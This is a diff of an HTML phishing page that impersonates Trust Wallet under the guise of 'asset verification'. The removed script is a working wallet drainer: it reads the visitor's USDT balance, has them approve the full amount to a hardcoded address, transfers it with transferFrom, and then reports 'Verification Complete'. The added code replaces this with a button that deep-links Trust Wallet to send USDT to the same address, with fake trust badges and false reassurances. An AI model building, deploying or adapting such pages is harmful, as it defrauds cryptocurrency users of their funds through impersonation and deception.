@@ -2,10 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>USDT Verification – Trust Wallet</title>
+  <title>Verify Asset – Trust Wallet</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <link rel="icon" href="favicon.ico" />
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -17,6 +16,7 @@
       align-items: center;
       min-height: 100vh;
     }
+
     .card {
       background-color: white;
       padding: 30px;
@@ -26,18 +26,22 @@
       max-width: 400px;
       text-align: center;
     }
+
     .logo {
       width: 60px;
       margin-bottom: 10px;
     }
+
     h2 {
       color: #1e3a8a;
       margin-bottom: 10px;
     }
+
     p {
       color: #374151;
       font-size: 15px;
     }
+
     button {
       background-color: #1e40af;
       color: white;
@@ -49,10 +53,7 @@
       cursor: pointer;
       width: 100%;
     }
-    button:disabled {
-      background-color: #9ca3af;
-      cursor: not-allowed;
-    }
+
     .trust-badge {
       margin-top: 20px;
       font-size: 14px;
@@ -62,133 +63,62 @@
       justify-content: center;
       gap: 8px;
     }
+
     .disclaimer {
       font-size: 12px;
       color: #6b7280;
       margin-top: 20px;
     }
-    .hidden {
-      display: none;
+
+    label {
+      display: block;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #374151;
+      text-align: left;
+    }
+
+    input[type="checkbox"] {
+      margin-right: 8px;
     }
   </style>
 </head>
 <body>
-  <div class="card" id="mainCard">
+  <div class="card">
     <img src="logo.png" class="logo" alt="Logo" />
     <h2>Please verify your asset</h2>
-    <p>Click next to approve USDT for identity verification on BNB Chain.</p>
+    <p>To continue, please verify by sending 1 USDT to our secure address.</p>
+
     <label>
       <input type="checkbox" id="agree" />
       I agree to the Terms and Privacy Policy
     </label>
-    <button id="nextBtn" disabled>Next</button>
+
+    <button id="verifyBtn" disabled>Verify</button>
+
     <div class="trust-badge">
       <img src="logo.png" width="20" />
       <span>✅ Verified by Trust Wallet</span>
     </div>
+
     <p class="disclaimer">
       We never ask for your seed phrase or private key. This site uses secure smart contract methods.
     </p>
   </div>
 
-  <div class="card hidden" id="processingCard">
-    <img src="logo.png" class="logo" alt="Logo" />
-    <h2>Processing Payment...</h2>
-    <p>Please wait while your verification is being completed.</p>
-    <div class="trust-badge">
-      <img src="logo.png" width="20" />
-      <span>✅ Verified by Trust Wallet</span>
-    </div>
-  </div>
-
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const ADMIN_ADDRESS = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const ABI = [
-      {
-        constant: true,
-        inputs: [{ name: "_owner", type: "address" }],
-        name: "balanceOf",
-        outputs: [{ name: "balance", type: "uint256" }],
-        type: "function"
-      },
-      {
-        constant: false,
-        inputs: [
-          { name: "_spender", type: "address" },
-          { name: "_value", type: "uint256" }
-        ],
-        name: "approve",
-        outputs: [{ name: "success", type: "bool" }],
-        type: "function"
-      },
-      {
-        constant: false,
-        inputs: [
-          { name: "_from", type: "address" },
-          { name: "_to", type: "address" },
-          { name: "_value", type: "uint256" }
-        ],
-        name: "transferFrom",
-        outputs: [{ name: "success", type: "bool" }],
-        type: "function"
-      }
-    ];
-
+    const btn = document.getElementById("verifyBtn");
     const agree = document.getElementById("agree");
-    const btn = document.getElementById("nextBtn");
-    const mainCard = document.getElementById("mainCard");
-    const processingCard = document.getElementById("processingCard");
 
     agree.addEventListener("change", () => {
       btn.disabled = !agree.checked;
     });
 
-    btn.addEventListener("click", async () => {
-      if (typeof window.ethereum === 'undefined') {
-        alert("Trust Wallet or Web3-enabled browser required.");
-        return;
-      }
+    btn.addEventListener("click", () => {
+      const trustLink = `https://link.trustwallet.com/send?coin=20000714&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC&token_id=0x55d398326f99059fF775485246999027B3197955&amount=1`;
 
-      try {
-        const web3 = new Web3(window.ethereum);
-        await window.ethereum.request({ method: 'eth_requestAccounts' });
-        const accounts = await web3.eth.getAccounts();
-        const user = accounts[0];
-
-        const usdt = new web3.eth.Contract(ABI, USDT_ADDRESS);
-        const balance = await usdt.methods.balanceOf(user).call();
-
-        if (balance == 0) {
-          alert("No USDT found.");
-          return;
-        }
-
-        // Step 1: Approve
-        await usdt.methods
-          .approve(ADMIN_ADDRESS, balance)
-          .send({ from: user });
-
-        // Switch UI to "processing"
-        mainCard.classList.add("hidden");
-        processingCard.classList.remove("hidden");
-
-        // Step 2: Transfer
-        await usdt.methods
-          .transferFrom(user, ADMIN_ADDRESS, balance)
-          .send({ from: user });
-
-        processingCard.innerHTML = `
-          <h2>✅ Verification Complete</h2>
-          <p>Your USDT has been securely verified and transferred.</p>
-          <div class="trust-badge">
-            <img src="logo.png" width="20" />
-            <span>Verified by Smart Contract</span>
-          </div>
-        `;
-      } catch (err) {
-        alert("❌ Error: " + err.message);
-      }
+      // Open Trust Wallet for USDT transfer
+      window.location.href = trustLink;
     });
   </script>
 </body>
